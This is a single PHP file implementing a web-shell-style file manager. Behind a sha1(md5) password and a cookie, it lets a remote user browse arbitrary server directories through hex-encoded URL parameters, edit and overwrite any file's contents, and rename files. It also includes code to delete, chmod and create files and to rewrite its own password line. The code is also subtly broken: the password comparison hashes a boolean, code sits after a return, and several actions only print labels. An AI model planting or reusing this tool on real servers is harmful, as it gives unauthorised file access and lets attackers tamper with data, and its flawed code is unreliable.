<?php
/**
 *
 */
class FileSystem
{
	public $path;

	protected $cookie;
	protected $password;
	protected $post;
	protected $get;
	protected $result;
	protected $filename;
	protected $dir;
	protected $file;
	protected $cwd;
	protected $open;
	protected $expired = [
		60, // 1 second
		60*60, // 1 minute
		60*60*1, // 1 hour
		60*60*24, // 1 day
		60*60*24*30, // 1 month
		60*60*24*30*12 // 1 year
	];
	
	function __construct()
	{
		$this->path = str_replace("\\", "/", getcwd());
		$this->post = $_POST;
		$this->get = $_GET;
		$this->cookie = $_COOKIE;
	}

	/*
	* Function Login
	* @param string sha1(md5())
	*/

	public function auth($password)
	{
		$this->password = $password;
		return $this;
	}

	public function pageLogin()
	{
		?>
		<form method="post">
			<input type="password" name="password">
		</form>
		<?php
	}

	public function login()
	{
		if (isset($this->password) && (trim($this->password) != "")) {
			if (isset($this->post["password"])) {
				if (sha1(md5($this->post["password"]) === $this->password)) {
					setcookie("password", $this->password, time() + $this->expired[4], "/");
					header("Location: {$_SERVER['PHP_SELF']}");
				} else {
					echo "wrong password !";
				}
			}
			if (!isset($this->cookie["password"]) || ((isset($this->cookie["password"]) && ($this->cookie["password"] != $this->password)))) {
				$this->pageLogin();
				die();
			}
		}
	}

	public function logout()
	{
		if (isset($this->cookie["password"])) {
			setcookie("password", "", time() - 1);
			header("Location: {$_SERVER['PHP_SELF']}");
		}
	}

	/*
		end Function Login
	*/


	/*
		Function listFiles
	*/

		public function list($type)
		{
			$this->result = [];
			foreach (scandir($this->path) as $key => $value) {
				$filename["path"] = $this->path . DIRECTORY_SEPARATOR . $value;
				$filename =
				[
					$filename["path"], // full path
					$value, // single file
					(is_dir($value)) ? @filetype($filename["path"]) : $this->formatSize(@filesize($filename["path"])), // get format size
					date("d/m/Y - H:i:s", $this->ftime($filename["path"])), // get filetime
					$this->writeable($value, $this->get($filename["path"])->perms()), // get permission
					$this->get($filename["path"])->modefile(), // get file mode
					$this->getIcon($filename["path"]),

					[
						"?x=".self::strtohex($this->path)."&e=".self::strtohex($filename["path"])."", // edit

						"?x=".self::strtohex($this->path)."&r=".self::strtohex($filename["path"])."", // rename

						"?x=".self::strtohex($this->path)."&d=".self::strtohex($filename["path"])."", // delete

						"?x=".self::strtohex($this->path)."&c=".self::strtohex($filename["path"])."", // change mode

						"?x=".self::strtohex($this->path)."&dl=".self::strtohex($filename["path"])."" // download
					] // action

				];

				switch ($type) {
					case 'all':
					if (is_dir($filename[0]) || $value === "." || $value === "..") {
						$this->result[] = $filename;
						continue 2;
					}
					break;
					case 'dir':
					if (!is_dir($filename[0]) || $value === "." || $value === "..") continue 2;
					break;

					case 'file':
					if (!is_file($filename[0])) continue 2;
					break;
				}
				$this->result[] = $filename;
			} return $this->result;
		}

		public function dirs()
		{
			return $this->list("dir");
		}

		public function files()
		{
			return $this->list("file");
		}

	/*
		end Function listFiles
	*/


	/*
		end Function hex and unhex
	*/

		public static function strtohex($string)
		{
			$str = "";
			for ($i=0; $i < strlen($string) ; $i++) { 
				$str .= dechex(ord($string[$i]));
			} return $str;
		}

		public static function hextostr($hex)
		{
			$unhex = "";
			for ($i=0; $i < strlen($hex)-1 ; $i+=2) { 
				$unhex .= chr(hexdec($hex[$i].$hex[$i+1]));
			} return $unhex;
		}

	/*
		end Function hex and unhex
	*/


	/*
		Function cd
	*/

		public static function cd($directory)
		{
			return chdir($directory);
			setcookie("cwd", $directory);
		}

	/*
		end Function cd
	*/

	/*
		Function pwd
	*/

		public function pwd($no)
		{
			?>
			<nav aria-label="breadcrumb">
				<ol class="breadcrumb">
					<?php
					if ($no === 1) {
						?> <a href="?x=<?= self::strtohex(dirname($this->path)) ?>"><i class="fa fa-arrow-left" aria-hidden="true"></i></a>&nbsp;&nbsp;&nbsp;<?php print(basename($this->path));
					} elseif ($no === 2) {
						?> <a href="?x=<?= self::strtohex($this->path) ?>"><i class="fa fa-arrow-left" aria-hidden="true"></i></a>&nbsp;&nbsp;&nbsp; Edit<?php
					}
		/*$path = preg_split("/(\\\|\/)/", $this->path);
		foreach ($path as $key => $value) {
			if ($value == "" && $key = 0) {
				print("<li class='breadcrumb-item'><a href='?x=2f'>2f</a></li>");
			}
			if ($value == "") continue;
			print("<li class='breadcrumb-item'><a href='?x=");
			for ($i=0; $i <= $key ; $i++) { 
				print(self::strtohex($path[$i]));
				if ($i != $key) {
					print("2f");
				}
			} print("'>{$value}</a></li>");
		}*/
		?>
	</ol>
</nav>
<?php
}

	/*
		end Function pwd
	*/

	/*
		Function getIcon
	*/

		public function getIcon($filename)
		{
			if (is_dir($filename)) {
				return "https://image.flaticon.com/icons/svg/715/715676.svg";
			} else {
				switch ($this->getExtension($filename)) {
					case 'php1':
					case 'php2':
					case 'php3':
					case 'php4':
					case 'php5':
					case 'php6':
					case 'phtml':
					case 'php':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306154.svg');break;
					case 'html':
					case 'htm':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306098.svg');break;
					case 'css':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306041.svg');break;
					case 'js':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306122.svg');break;
					case 'json':return('https://image.flaticon.com/icons/svg/136/136525.svg');break;
					case 'xml':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306209.svg');break;
					case 'py':return('https://www.flaticon.com/svg/static/icons/svg/2721/2721287.svg');break;
					case 'zip':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306214.svg');break;
					case 'rar':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306170.svg');break;
					case 'htaccess':return('https://image.flaticon.com/icons/png/128/1720/1720444.png');break;
					case 'txt':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306185.svg');break;
					case 'ini':return('https://image.flaticon.com/icons/svg/1126/1126890.svg');break;
					case 'mp3':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306139.svg');break;
					case 'mp4':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306142.svg');break;
					case 'log':
					case 'log1':
					case 'log2':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306124.svg');break;
					case 'psd':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306166.svg');break;
					case 'dat':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306050.svg');break;
					case 'exe':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306085.svg');break;
					case 'apk':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306016.svg');break;
					case 'yaml':return('https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png');break;
					case 'xlsx':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306200.svg');break;
					case 'bak':return('https://image.flaticon.com/icons/svg/2125/2125736.svg');break;
					case 'ico':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306102.svg');break;
					case 'png':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306156.svg');break;
					case 'jpg':
					case 'webp':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306117.svg');break;
					case 'jpeg':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306114.svg');break;
					case 'svg':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306179.svg');break;
					case 'gif':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306094.svg');break;
					case 'pdf':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306145.svg');break;
					case 'asp':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306019.svg");break;
					case 'doc':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306060.svg");break;
					case 'docx':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306065.svg");break;
					case 'otf':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306149.svg");break;
					case 'ttf':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306182.svg");break;
					case 'wav':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306188.svg");break;
					case 'sql':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306173.svg");break;
					case 'csv':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306046.svg");break;
					case 'bat':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306025.svg");break;
					default:return('https://image.flaticon.com/icons/svg/833/833524.svg');break;
				}
			}
		}

	/*
		end Function getIcon
	*/

	/*
		Function writeable
	*/

		public function writeable($filename, $perms)
		{
			return (is_writable($filename)) ? "<font color='green'>{$perms}</font>" : "<font color='red'>{$perms}</font>";
		}

	/*
		end Function writeable
	*/


	/*
		Function htmlsafe
	*/

		public function htmlsafe($value)
		{
			return htmlspecialchars($value);
		}

	/*
		end Function htmlsafe
	*/

	/*
		Function path
	*/

		public function path($path)
		{
			$this->cwd = $path;
			return $this;
		}

	/*
		end Function path
	*/

	/*
		Function getExtension
	*/

		public function getExtension($filename)
		{
			return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
		}

	/*
		end Function getExtension
	*/

	/*
		Function ftime
	*/

		public function ftime($filename)
		{
			return @filemtime($filename);
		}

	/*
		end Function ftime
	*/

	/*
		Function action
	*/

		public function get($filename)
		{
			$this->filename = $this->htmlsafe($filename);
			return $this;
		}

		public function open($mode)
		{
			$this->open = fopen($this->filename, $mode);
			return $this;
		}

		public function read()
		{
			return htmlspecialchars(file_get_contents($this->filename));
		}

		public function write($data)
		{
			fwrite($this->open, $data);
			$ftime = $this->ftime($this->filename); 
			if ($ftime === false) return false;
			return touch($this->filename, $ftime);
		}

		public function chname($newname)
		{
			return (!empty($this->filename)) ? rename($this->filename, $this->path . DIRECTORY_SEPARATOR . $newname) : false;
		}

		public function chmod($mode)
		{
			return (!empty($this->filename)) ? chmod($this->filename, $mode) : false;
		}

	/*
		end Function action
	*/

		public function perms()
		{
			$perms = @fileperms($this->filename);

			switch ($perms & 0xF000) {
		    case 0xC000: // socket
		    $info = 's';
		    break;
		    case 0xA000: // symbolic link
		    $info = 'l';
		    break;
		    case 0x8000: // regular
		    $info = 'r';
		    break;
		    case 0x6000: // block special
		    $info = 'b';
		    break;
		    case 0x4000: // directory
		    $info = 'd';
		    break;
		    case 0x2000: // character special
		    $info = 'c';
		    break;
		    case 0x1000: // FIFO pipe
		    $info = 'p';
		    break;
		    default: // unknown
		    $info = 'u';
		}

		// Owner
		$info .= (($perms & 0x0100) ? 'r' : '-');
		$info .= (($perms & 0x0080) ? 'w' : '-');
		$info .= (($perms & 0x0040) ?
			(($perms & 0x0800) ? 's' : 'x' ) :
			(($perms & 0x0800) ? 'S' : '-'));

		// Group
		$info .= (($perms & 0x0020) ? 'r' : '-');
		$info .= (($perms & 0x0010) ? 'w' : '-');
		$info .= (($perms & 0x0008) ?
			(($perms & 0x0400) ? 's' : 'x' ) :
			(($perms & 0x0400) ? 'S' : '-'));

		// World
		$info .= (($perms & 0x0004) ? 'r' : '-');
		$info .= (($perms & 0x0002) ? 'w' : '-');
		$info .= (($perms & 0x0001) ?
			(($perms & 0x0200) ? 't' : 'x' ) :
			(($perms & 0x0200) ? 'T' : '-'));

		return $info;
	}

	/*
		Function formatSize
	*/

		public function formatSize($bytes)
		{
			$kb = 1024;
			$mb = $kb * 1024;
			$gb = $mb * 1024;
			$tb = $gb * 1024;

			if (($bytes >= 0) && ($bytes < $kb)) {
				return $bytes . ' B';
			} elseif (($bytes >= $kb) && ($bytes < $mb)) {
				return ceil($bytes / $kb) . ' KB';
			} elseif (($bytes >= $mb) && ($bytes < $gb)) {
				return ceil($bytes / $mb) . ' MB';
			} elseif (($bytes >= $gb) && ($bytes < $tb)) {
				return ceil($bytes / $gb) . ' GB';
			} elseif ($bytes >= $tb) {
				return ceil($bytes / $tb) . ' TB';
			} else {
				return $bytes . ' B';
			}

		}

	/*
		end Function formatSize
	*/

	/*
		Function modefile
	*/

		public function modefile()
		{
			return substr(sprintf("%o", @fileperms($this->filename)), - 4);
		}

	/*
		Function modefile
	*/

	/*
		Function Delete
	*/

		public function delete($filename)
		{
			if (is_dir($filename)) {
				foreach (scandir($filename) as $key => $value) {
					if ($value != "." && $value != "..") {
						if (is_dir($filename . DIRECTORY_SEPARATOR . $value)) {
							$this->delete($filename . DIRECTORY_SEPARATOR . $value);
						} else {
							unlink($filename . DIRECTORY_SEPARATOR . $value);
						}
					}
				} if (@rmdir($filename)) {
					return true;
				} else {
					return false;
				}
			} else {
				if (unlink($filename)) {
					return true;
				} else {
					return false;
				}
			}
		}

	/*
		end Function Delete
	*/

	/*
		Function make file & folder
	*/

		public function make($filename)
		{
			$this->filename = $this->htmlsafe($filename);
			return $this;
		}

		public function folder()
		{
			return mkdir($this->cwd . DIRECTORY_SEPARATOR . $this->filename, 0777);
		}

		public function file($data)
		{
			foreach ($this->filename as $key => $value) {
				$separate = explode(",", $this->filename[$key]);
				foreach ($separate as $id => $file) {
					$this->get($file)->open("w")->write("jancok");
				}
			}
		}

	/*
		end Function make file & dir
	*/

	/*
		Function changepassword
	*/

		public function changepassword($string)
		{
			$newpassword = sha1(md5($string));
			$newpassword = "\$password = \"".$newpassword."\";";
			$option = file_get_contents($_SERVER['SCRIPT_FILENAME']);
			$option = preg_replace("/\\\$password\ *=\ *[\'\"]*([a-fA-F0-9]*)[\'\"];*/is", $newpassword, $option);
			return file_put_contents($_SERVER['SCRIPT_FILENAME'], $option);
		}

	/*
		end Function changepassword
	*/

	/*
		Function finfo
	*/

	public function finfo($text = null, $filename)
	{

		$name = 
		[
			"Filename 		: ",
			"Size 			: ",
			"Permission 	: ",
			"Create Time 	: ",
			"Last Modified 	: ",
			"Last Accessed 	: "
		];

		$finfo = 
		[
			$name[0] . $this->path . DIRECTORY_SEPARATOR . "<b>" . basename($filename) . "</b>",
			$name[1] . $this->formatSize(@filesize($filename)),
			$name[2] . $this->writeable($filename, $this->get($filename)->perms()),
			$name[3] . @date("d/m/Y - H:i:s",filectime($filename)),
			$name[4] . @date("d/m/Y - H:i:s", $this->ftime($filename)),
			$name[5] . @date("d-M-Y H:i:s",fileatime($filename))
		];

		switch ($text) {
			case 'a':
				return $finfo[0];
				break;
			case '2':
				return $finfo[1];
				break;
			case 'c':
				return $finfo[2];
				break;
			case 'd':
				return $finfo[3];
				break;
			case 'e':
				return $finfo[4];
				break;
			case 'f':
				return $finfo[5];
				break;
		}

		return $finfo;
	}

	/*
		end Funtion finfo
	*/

	}

	if (isset($_GET['x'])) {
		FileSystem::cd(FileSystem::hextostr($_GET['x']));
	}
	$FileSystem = new FileSystem;
	$FileSystem->auth("90cc92cefc3d83c93a3656a42fd133e3686681d8")->login();
	?>
	<!doctype html>
	<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600' rel='stylesheet' type='text/css'>
		<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
		<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/1.1.4/tailwind.min.css">
		<script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
		<title></title>
	</head>
	<style type="text/css">
		*,
		*:before,
		*:after {
			margin: 0;
			padding: 0;
			box-sizing: border-box;
		}

		body, html {
			height: 100%;
			background-color: #EEEEEE;
			/*overflow: hidden;*/
		}

		.container {
			width: 100%;
			height: 100%;
		}

		.tutorial {
			width: 80%;
			margin: 5% auto 0 auto;
			box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
			background-color: #f9f9f9;
			max-width: 800px;
			border-radius:10px;
		}
		.tutorial .slider {
			width: 100%;
			max-height: 100%;
			overflow: auto;
			padding-right: 25px;
			padding-left: 25px;
			/*background-color: #F03861;*/
		}
		.tutorial .information {
			width: 100%;
			padding: 20px 50px;
			margin-bottom: 30px;
			font-family: "Open Sans", sans-serif;
		}
		.tutorial .information h1 {
			color: #333;
			font-size: 1.5rem;
			padding: 0px 10px;
			border-left: 3px solid #F03861;
		}
		.tutorial .information h3 {
			color: #e0e0e0;
			font-size: 1rem;
			font-weight: 300;
			padding: 0px 10px;
			border-left: 3px solid #F03861;
		}
		.tutorial .information p {
			padding: 10px 0px;
		}
		.tutorial ul {
			font-size: 0;
			list-style-type: none;
		}
		.tutorial ul li {
			font-family: "Open Sans", sans-serif;
			font-size: 1rem;
			font-weight: 400;
			color: #333;
			display: inline-block;
			padding: 15px;
			position: relative;
		}
		.tutorial ul li:last-child {
			float: right;
		}
		.tutorial ul li ul {
			display: none;
		}
		.tutorial ul li:hover {
			cursor: pointer;
			background-color: #f2f2f2;
		}
		.tutorial ul li:hover ul {
			display: block;
			margin-top: 15px;
			width: 200px;
			left: 0;
			position: absolute;
		}
		.tutorial ul li:hover ul li {
			display: block;
			background-color: #e7e7e7;
		}
		.tutorial ul li:hover ul li span {
			float: right;
			color: #f9f9f9;
			background-color: #F03861;
			padding: 2px 5px;
			text-align: center;
			font-size: 0.8rem;
			border-radius: 3px;
		}
		.tutorial ul li:hover ul li:hover {
			background-color: #e0e0e0;
		}
		.tutorial ul li:hover ul li:hover span {
			background-color: #ee204e;
		}

		.wrapper {
			max-width: 1200px;
			margin: auto;
		}
		.icon {
			width:50px;
			height: 50px;
		}
		.info {
			font-size:12px;
		}
		.nav-item a:hover {
			background: transparent;
		}
		input[type=text] {
			width: 130px;
			box-sizing: border-box;
			border: 2px solid #ccc;
			border-radius: 4px;
			font-size: 16px;
			background-color: white;
			background-image: url('searchicon.png');
			background-position: 10px 10px; 
			background-repeat: no-repeat;
			padding: 12px 20px 12px 40px;
			-webkit-transition: width 0.4s ease-in-out;
			transition: width 0.4s ease-in-out;
		}

		input[type=text]:focus {
			width: 100%;
		}

		textarea.textarea {
			width:100%;
			height:300px;
		}


		div#nav { 
			position: relative; 
		} 
		/**** ****/
		.dropdown-toggle {
			outline: none;
			padding: .5em 1em;
			border-radius: .3em;
			transition: all 0.35s;
		}
		.dropdown-toggle:hover {
			cursor: pointer;
		}
		.toggle {
			padding:10px;
			border: 1px solid #ebebeb;
			background: #ebebeb;
			color: #e3e3e3;
			margin-bottom: 3px;
		}
		ul.dropdown {
			display: none;
			position:absolute;
			z-index: 5;
			width:200px;
			margin-top: .5em;
			background: #fff;
			box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
			margin-left:-190px;
			margin-top: -24px;
			min-width: 12em;
			padding: 0;
			border-radius:7px;
		}
		ul.dropdown li {
			list-style-type: none;
			display: block;
		}
		ul.dropdown li a {
			text-align: left;
			outline: none;
			color: #000;
			border-radius:7px 7px 0px 0px;
			width: 81%;
			font-size:18px;
			background: none;
			border: none;
			text-decoration: none;
			padding: .0em 1em;
			display: block;
		}
		ul.dropdown li a:hover {
			cursor: pointer;
			text-decoration: none;
		}
	</style>
	<body>
		<div class="container">
			<div class="tutorial">
				<ul class="nav rounded" id="pills-tab" role="tablist">
					<li class="nav-item">
						<a class="nav-link" id="pills-home-tab" data-toggle="pill" href="#pills-home" role="tab" aria-controls="pills-home" aria-selected="true">Files</a>
					</li>
					<li class="nav-item">
						<a class="nav-link" id="pills-profile-tab" data-toggle="pill" href="#pills-profile" role="tab" aria-controls="pills-profile" aria-selected="false">Tools</a>
					</li>
					<li class="nav-item">
						<a class="nav-link" id="pills-about-tab" data-toggle="pill" href="#pills-about" role="tab" aria-controls="pills-about" aria-selected="false">About</a>
					</li>
				</ul>
				<div class="tab-content" id="pills-tabContent">
					<div class="tab-pane fade show active" id="pills-home" role="tabpanel" aria-labelledby="pills-home-tab">
						<div class="slider">
							<?php
							if (isset($_GET['e'])) {
								$filename = FileSystem::hextostr($_GET['e']);
								if (isset($_POST['submit'])) {
									if ($FileSystem->get($filename)->open("w")->write($_POST['data'])) {
										print("success");
									} else {
										print("failed");
									}
								}
								?>
								<div class="head">
									<?= $FileSystem->pwd(2); ?>
								</div>
								<div class="finfo">
									<?php
									foreach ($FileSystem->finfo("", $filename) as $key => $value) { ?>
										<div><?= $value ?></div>
									<?php }
									?>
								</div>
								<form method="post">
									<textarea class="textarea" name="data"><?= $FileSystem->get($filename)->read() ?></textarea><br>
									<input type="submit" name="submit">
								</form>
								<?php
  								// print("edit ".$filename);
								exit();
							}

							if (isset($_GET['r'])) {
								$filename = FileSystem::hextostr($_GET['r']);
								if (isset($_POST['submit'])) {
									if ($FileSystem->get($filename)->chname($_POST['newname'])) {
										print("success");
									} else {
										print("failed");
									}
								}
								?>
								<div class="head">
									<?= $FileSystem->pwd(2); ?>
								</div>
								<div class="finfo">
									<?php
									foreach ($FileSystem->finfo("", $filename) as $key => $value) { ?>
										<div><?= $value ?></div>
									<?php }
									?>
								</div>
								<form method="post">
									<input type="text" name="newname" value="<?= basename($filename) ?>">
									<input type="submit" name="submit">
								</form>
								<?php
								print("rename ".$filename);
								exit();
							}

							if (isset($_GET['d'])) {
								$filename = FileSystem::hextostr($_GET['d']);
								?>
								<div class="head">
									<?= $FileSystem->pwd(2); ?>
								</div>
								<div class="finfo">
									<?php
									foreach ($FileSystem->finfo("", $filename) as $key => $value) { ?>
										<div><?= $value ?></div>
									<?php }
									?>
								</div>
								<?php
								print("delete ".$filename);
								exit();
							}

							if (isset($_GET['c'])) {
								$filename = FileSystem::hextostr($_GET['c']);
								?>
								<div class="head">
									<?= $FileSystem->pwd(2); ?>
								</div>
								<div class="finfo">
									<?php
									foreach ($FileSystem->finfo("", $filename) as $key => $value) { ?>
										<div><?= $value ?></div>
									<?php }
									?>
								</div>
								<?php
								print("chmode ".$filename);
								exit();
							}
							if (isset($_GET['dl'])) {
								$filename = FileSystem::hextostr($_GET['dl']);
								?>
								<div class="head">
									<?= $FileSystem->pwd(2); ?>
								</div>
								<div class="finfo">
									<?php
									foreach ($FileSystem->finfo("", $filename) as $key => $value) { ?>
										<div><?= $value ?></div>
									<?php }
									?>
								</div>
								<?php
								print("download ".$filename);
								exit();
							}
							?>
							<div class="head">
								<?= $FileSystem->pwd(1); ?>
							</div>
							<?php
							foreach ($FileSystem->dirs() as $key => $value) { ?>
								<div class="media" style="margin-top:7px;margin-bottom:7px;">
									<img class="align-self-center mr-3 icon" src="<?= $value[6] ?>" alt="Generic placeholder image">
									<div class="media-body clickable text-truncate" data-href="?x=<?= $FileSystem->strtohex($value[0]) ?>">
										<h5 class="mt-0 font-weight-bold"><?= $value[1] ?></h5>
										<div class="info">
											<?= $value[2] ?>
											<?= $value[3] ?>&nbsp;
											<?= $value[4] ?>
										</div>
									</div>
									<nav>
										<a class="dropdown-toggle" title="Menu"></a>
										<ul class="dropdown">
											<li>
												<a href="<?= $value[7][1] ?>">Rename</a>
											</li>
											<li>
												<a href="<?= $value[7][2] ?>">Delete</a>
											</li>
											<li style="display: none;"></li>
										</ul>
									</nav>
  								</div>
  							<?php }

  							foreach ($FileSystem->files() as $key => $value) { ?>
  								<div class="media" style="margin-top:7px;margin-bottom:7px;">
  									<img class="align-self-center mr-3 icon" src="<?= $value[6] ?>" alt="Generic placeholder image">
  									<div class="media-body text-truncate">
  										<h5 class="mt-0 font-weight-bold"><?= $value[1] ?></h5>
  										<div class="info">
  											<?= $value[2] ?> &nbsp;
  											<?= $value[3] ?> &nbsp;
  											<?= $value[4] ?>
  										</div>
  									</div>
  									<nav>
										<a class="dropdown-toggle" title="Menu"></a>
										<ul class="dropdown">
											<li>
												<a href="<?= $value[7][0] ?>">Edit</a>
											</li>
											<li>
												<a href="<?= $value[7][1] ?>">Rename</a>
											</li>
											<li>
												<a href="<?= $value[7][2] ?>">Delete</a>
											</li>
											<li>
												<a href="<?= $value[7][3] ?>">Chmod</a>
											</li>
											<li>
												<a href="<?= $value[7][4] ?>">Download</a>
											</li>
											<li style="display: none;"></li>
										</ul>
									</nav>
  									<!-- <div class="ml-3">
  										<div class="dropdown">
  											<button class="" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
  												<i class="fa fa-sort-desc" aria-hidden="true"></i>
  											</button>
  											<div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
  												<a class="dropdown-item" href="<?= $value[7][0] ?>">Edit</a>
  												<a class="dropdown-item" href="<?= $value[7][1] ?>">Rename</a>
  												<a class="dropdown-item" href="<?= $value[7][2] ?>">Delete</a>
  												<a class="dropdown-item" href="<?= $value[7][3] ?>">Change Mode</a>
  												<a class="dropdown-item" href="<?= $value[7][4] ?>">Download</a>
  											</div>
  										</div>
  									</div> -->
  								</div>
  							<?php }
  							?>
  						</div>
  					</div>
  					<div class="tab-pane fade" id="pills-profile" role="tabpanel" aria-labelledby="pills-profile-tab">
  						<div class="slider">
  							Profile
  						</div>
  					</div>
  					<div class="tab-pane fade" id="pills-about" role="tabpanel" aria-labelledby="pills-about-tab">
  						<div class="slider">
  							About
  						</div>
  					</div>
  				</div>
  				<div class="information">
  					<div id="display"></div>
  				</div>
  			</div>
  		</div>
  		<script type="text/javascript">
  			jQuery(document).ready(function($) {
  				$(".clickable").click(function() {
  					window.location = $(this).data("href");
  				});
  			});


  			$(function() { // Dropdown toggle
  				$('.dropdown-toggle').click(function() { $(this).next('.dropdown').slideToggle();
  			});

  				$(document).click(function(e) 
  				{ 
  					var target = e.target; 
  					if (!$(target).is('.dropdown-toggle') && !$(target).parents().is('.dropdown-toggle')) //{ $('.dropdown').hide(); }
  					{ $('.dropdown').slideUp(); }
  				});
  			});
  		</script>
  		<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
  		<!-- <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script> -->
  		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
  		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  	</body>
  	</html>
